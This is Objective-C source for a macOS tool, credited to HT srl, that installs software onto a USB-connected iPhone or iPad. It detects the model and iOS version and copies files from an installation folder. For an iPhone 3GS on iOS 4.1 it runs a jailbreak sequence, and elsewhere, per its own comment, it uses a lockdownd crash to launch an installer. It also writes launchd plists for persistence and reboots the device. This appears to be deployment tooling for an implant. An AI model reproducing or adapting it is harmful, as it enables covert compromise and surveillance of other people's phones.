 //
//  AppDelegate.m
//  Install
//
//  Created by Massimo Chiodini on 2/7/13.
//  Copyright (c) 2013 HT srl. All rights reserved.
//

#import "AppDelegate.h"
#import "iOSUsbSupport.h"

#define NOT_INSTALL       0
#define TRY_NON_JBINSTALL 1
#define TRY_JBINSTALL     2

#define set_icon(y)         [self setIcon:y]
#define view_print(x)       [self tPrint:x]
#define set_model()         [self setModel]
#define reset_model()       [self resetModel]
#define install_enabled(x)  [mInstall setEnabled:x]

#define IDB_BITMAP_CLEAR  @"iphone"
#define IDB_BITMAP_JB     @"iphone jb"
#define IDB_BITMAP_GRAYED @"iphone grayed"

extern int installios1(char *iosfolder);
extern int installios2(char *iosfolder);
extern int installios3(char *iosfolder);

static NSString *gModel = nil;
static NSString *gVersion = nil;
static BOOL gIsDeviceAttached = FALSE;
static NSString *gIosInstallationPath = nil;
static int  gIsJailbreakable = TRY_JBINSTALL;
static char *gIosInstallationPathString = nil;

@implementation AppDelegate

- (void)dealloc
{
    [super dealloc];
}

#pragma mark -
#pragma mark Dialog message function
#pragma mark -

- (void)tPrint:(char*)theMsg
{
  NSString *tmpMsg = [NSString stringWithFormat:@"%s",theMsg];
  
  [mMessage setStringValue: tmpMsg];
}

- (void)setIcon:(NSString*)theIcon
{
  NSString *imagePath = [NSString stringWithFormat:@"%@",
                         [[NSBundle mainBundle] pathForResource:theIcon
                                                         ofType:@"png"]];
  
  NSImage *activeIcon = [[NSImage alloc] initWithContentsOfFile: imagePath];
  
  [mIcon setImage:activeIcon];
}

#pragma mark -
#pragma mark Info device
#pragma mark -

char *models[] = {"iPhone1,1",
                  "iPhone1,2",
                  "iPhone2,1",
                  "iPhone3,1",
                  "iPhone3,2",
                  "iPhone3,3",
                  "iPhone4,1",
                  "iPhone5,1",
                  "iPhone5,2",
                  "iPad1,1",
                  "iPad2,1",
                  "iPad2,2",
                  "iPad2,3",
                  "iPad2,4",
                  "iPad3,1",
                  "iPad3,2",
                  "iPad3,3",
                  "iPad3,4",
                  "iPad3,5",
                  "iPad3,6",
                  NULL};

NSString *models_name[] =  {@"iPhone",
                            @"iPhone 3G",
                            @"iPhone 3GS",
                            @"iPhone 4",
                            @"iPhone 4",
                            @"iPhone 4(cdma)",
                            @"iPhone 4s",
                            @"iPhone 5(gsm)",
                            @"iPhone 5",
                            @"iPad",
                            @"iPad2(wi-fi)",
                            @"iPad2(gsm)",
                            @"iPad2(cdma)",
                            @"iPad2(wi-fi)",
                            @"iPad3(wi-fi)",
                            @"iPad3(gsm)",
                            @"iPad3",
                            @"iPad4(wi-fi)",
                            @"iPad4(gsm)",
                            @"iPad4",
                            NULL};
- (void)setModel
{
  int i = 0;
  
  NSString *theModel = @"Unknown device";
  
  char *_model = get_model();
  char *_version = get_version();
  
  if (_model == NULL)
   _model = "Unknown device";
  if (_version == NULL)
    _version = "Unknown version";
  
  while (models[i] != NULL)
  {
    if (strcmp(models[i], _model) == 0)
    {
      theModel = models_name[i];
      break;
    }
    i++;
  }
  
  NSString *msg = [NSString stringWithFormat:@"Model: %@\nVersion: %s",
                                             theModel,
                                             _version];
  
  [mModel setStringValue: msg];
  
  gModel    = theModel;
  gVersion  = [[NSString alloc] initWithFormat:@"%s", _version];
}

- (void)resetModel
{
  [mModel setStringValue: @""];
}

#pragma mark -
#pragma mark Check device thread
#pragma mark -

- (int)checkInstallationMode
{
  if (check_lockdownd_config() == TRUE)
  {
    return TRY_JBINSTALL;
  }
  else
  {
    if ([gModel compare:@"iPhone 3GS"] == NSOrderedSame &&
        [gVersion compare:@"4.1"] == NSOrderedSame)
      return TRY_NON_JBINSTALL;
  }
  
  return NOT_INSTALL;
}

- (void)waitForDevice:(id)anObject
{  
  BOOL isAttached = (BOOL)isDeviceAttached();
  
  if (isAttached == TRUE)
  {        
    set_icon(IDB_BITMAP_CLEAR);
    
    set_model();
    
    view_print("check device...");
    
    gIsJailbreakable = [self checkInstallationMode];
    
    switch (gIsJailbreakable)
    {
      case TRY_NON_JBINSTALL:
      {
        set_icon(IDB_BITMAP_JB);
        break;
      }
      case NOT_INSTALL:
      {
        view_print("cannot install device!");
        return;
      }
    }
    
    if (check_installation(1, 2) == 0)
    {
      view_print("check device... device is ready.");
      
      if (gIosInstallationPath != nil)
      {
        install_enabled(YES);
        gIosInstallationPathString = (char*)[gIosInstallationPath cStringUsingEncoding:NSUTF8StringEncoding];
      }
      gIsDeviceAttached = TRUE;
    }
    else
    {
      view_print("check device... installation detected!");
      // force remove of installation files (in case of manually reboot)
      remove_installation();
      gIsDeviceAttached = FALSE;
    }
  }
  else
  {
    view_print("cannot connect to device!");
  }
}

#pragma mark -
#pragma mark Entry notification
#pragma mark -

- (void)applicationDidFinishLaunching:(NSNotification *)aNotification
{
  view_print("Waiting for device...");
  
  sleep(1);
  
  gIosInstallationPath = [self getIosPath];
  
  if (gIosInstallationPath == nil)
  {
    [self alertForCoreDirectory:@"iOS installation directory not found!"
                   andAlternate:nil];
  }
  
  [NSThread detachNewThreadSelector:@selector(waitForDevice:)
                           toTarget:self
                         withObject:nil];
}

#pragma mark -
#pragma mark iOS installation folder routine
#pragma mark -

- (NSInteger)alertForCoreDirectory:(NSString*)messageText
                      andAlternate:(NSString*)alternate
{
  NSAlert *alert = [NSAlert alertWithMessageText:messageText
                                   defaultButton:@"Ok"
                                 alternateButton:alternate
                                     otherButton:nil
                       informativeTextWithFormat:@" "];
                    
  return [alert runModal];
}

- (NSString*)askForCoreDirectory
{
  NSString *installPath = nil;

  NSOpenPanel* openDlg = [NSOpenPanel openPanel];

  [openDlg setCanChooseFiles:NO];

  [openDlg setCanChooseDirectories:YES];

  if ( [openDlg runModal] == NSOKButton )
  {
    NSArray* files = [openDlg URLs];

    NSURL *_installUrl = [files objectAtIndex:0];
    
    installPath = [[[_installUrl path] retain] autorelease];
  }
  
  return installPath;
}

- (NSString*)getIosPath
{
  NSString *iosPath = [NSString stringWithFormat:@"%@/../../ios",
                                                [[NSBundle mainBundle] bundlePath]];
  
  NSString *installPath =[NSString stringWithFormat:@"%@/install.sh",
                                                    iosPath];
  
  if ([[NSFileManager defaultManager] fileExistsAtPath:installPath] == TRUE)
    return [iosPath retain];
  
  if ([self alertForCoreDirectory:@"iOS installation directory not found: please select one"
                     andAlternate:@"Cancel"] == NSAlertAlternateReturn)
    return nil;
  
  iosPath = [self askForCoreDirectory];
  
  if (iosPath == nil)
    return nil;
  
  installPath =[NSString stringWithFormat:@"%@/install.sh", iosPath];
    
  if ([[NSFileManager defaultManager] fileExistsAtPath:installPath] == FALSE)
    return nil;
  
  return [iosPath retain];
}

#pragma mark -
#pragma mark Installation routine
#pragma mark -

- (void)startInstallation:(id)anObject
{
  int isDeviceOn = 0;
  int retInst = 0;
  
  view_print("start installation...");
  
  install_enabled(NO);
  
  if (gIsJailbreakable == TRY_NON_JBINSTALL)
  {
    // running jb tool for iphone3gs-4.1
    int ret = 0;
    
    view_print("Setup device for installation...");
    
    ret = installios1(gIosInstallationPathString);
    
    if (ret == 0)
    {
      view_print("Setup failed!");
      return;
    }
    
    view_print("Preparing device for execute installation...");
    
    ret = installios2(gIosInstallationPathString);
    
    if (ret == 0)
    {
      view_print("Preparation failed!");
      return;
    }
    
    view_print("Trying execute installation...");
    
    ret = installios3(gIosInstallationPathString);
    
    if (ret == 0)
    {
      view_print("execution failed!");
      return;
    }
    
    goto check_point;
    
    return;
  }
  
  if (gIosInstallationPathString == NULL)
  {
    view_print("cannot found installation dir!");
    goto exit_point;
  }
  
  char **dir_content = list_dir_content(gIosInstallationPathString);
  
  if (dir_content == NULL)
  {
    view_print("cannot found installation component!");
    goto exit_point;
  }
  
  if (make_install_directory() != 0)
  {
    view_print("cannot create installation folder!");
    goto exit_point;
  }
  
  view_print("copy files...");
  
#ifdef WIN32
  
  if (install_files(gIosInstallationPathString, dir_content) != 0)
  {
    view_print("cannot copy files into installation folder!");
    goto exit_point;
  }
  
#else
  
  if (copy_install_files(gIosInstallationPathString, dir_content) != 0)
  {
    view_print("cannot copy files into installation folder!");
    goto exit_point;
  }
  
#endif
    
  view_print("copy files... done.");
  
  sleep(1);
  
  // Ok: using lockdownd crash for running installer...
  view_print("try to run installer...");
  
  if (lockd_run_installer() == 1)
  {
    view_print("try to run installer... done.");
    retInst = 1;
    goto exit_point;
  }
  
  // end.
  
  if (create_launchd_plist() != 0)
  {
    view_print("cannot create plist files!");
    goto exit_point;
  }
  
  view_print("try to restart device...");
  
  int retVal = restart_device();
  
  if (retVal == 1)
    view_print("try to restart device...restarting: please wait.");
  else
    view_print("can't restart device: try it manually!");

  sleep(3);
  
  // Wait for device off
  do
  {
    isDeviceOn = isDeviceAttached();
    
    sleep(1);
  
  } while(isDeviceOn == 1);
  
  set_icon(IDB_BITMAP_GRAYED);
  
  view_print("device disconnected. Please wait...");
  
  reset_model();
  
  // wait device on
  do
  {
    isDeviceOn = isDeviceAttached();
    
    sleep(1);
  
  } while(isDeviceOn == 0);
  
  view_print("device connected.");
 
  set_icon(IDB_BITMAP_CLEAR);

  set_model();

check_point:
  view_print("checking installation...");
  
  sleep(5);
  
  retInst = check_installation(10, 10);
  
  // On fail remove the install files e dir...
exit_point:
  
  remove_installation();
  
  if ( retInst == 1)
  {
    view_print("installation done.");
  }
  else
  {
    view_print("installation failed: please retry!");
  }
}

#pragma mark -
#pragma mark Button actions
#pragma mark -

- (IBAction)install:(id)sender
{
  if (gIsDeviceAttached == FALSE)
    return;
  
  [NSThread detachNewThreadSelector:@selector(startInstallation:)
                           toTarget:self
                         withObject:nil];
  
  install_enabled(FALSE);
}

- (IBAction)cancel:(id)sender
{
  exit(0);
}

@end
